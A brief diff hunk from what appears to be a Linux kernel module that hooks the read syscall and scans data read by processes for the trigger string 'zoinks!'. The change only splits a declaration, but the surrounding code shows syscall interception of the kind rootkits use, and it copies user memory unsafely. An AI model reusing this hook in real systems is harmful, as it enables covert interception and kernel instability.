@@ -35,7 +35,8 @@ asmlinkage long new_sys_read(int fd, void __user *buf, size_t count) {
     }
     ssize_t bytes_read;
     bytes_read = ref_sys_read(fd, buf, count);
-    char* buf_copy = kmalloc(bytes_read+1, GFP_KERNEL);
+    char* buf_copy;
+    buf_copy = kmalloc(bytes_read+1, GFP_KERNEL);
     memcpy(buf_copy, buf, bytes_read);
     buf_copy[bytes_read] = '\0';
     if (strstr(buf_copy, "zoinks!") != NULL) {
